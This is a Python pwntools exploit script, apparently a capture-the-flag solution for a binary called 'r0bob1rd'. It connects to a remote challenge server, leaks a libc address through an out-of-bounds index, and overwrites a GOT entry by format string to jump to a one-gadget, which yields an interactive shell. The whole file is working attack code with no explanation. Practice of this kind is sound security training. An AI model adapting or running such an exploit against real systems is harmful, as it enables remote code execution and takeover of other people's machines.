#!/usr/bin/env python3

from pwn import *

exe = "./r0bob1rd_patched"
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

idxOffset = (0x602030 - 0x6020A0) // 8
inputOffset = 0x68
libcOffset = 0x61C90

context.log_level = "debug"
io = remote("94.237.120.119", 34967)

# leak libc
io.sendlineafter(b"Select a R0bob1rd > ", str(idxOffset).encode())
io.recvuntil(b"You've chosen: ")
libc.address = u64(io.recv(6).ljust(8, b"\x00")) - libcOffset
info("libcBase: %#x", libc.address)

# fmtstr GOT overwrite
gadget = 0xE3B01
payload = fmtstr_payload(
    offset=8,
    writes={elf.got.puts + 8: p64(gadget + libc.address)},
    write_size="short",
)
payload = flat({0: payload, inputOffset: b"aa"})
io.sendlineafter(b"Enter bird's little description", payload)

io.interactive()
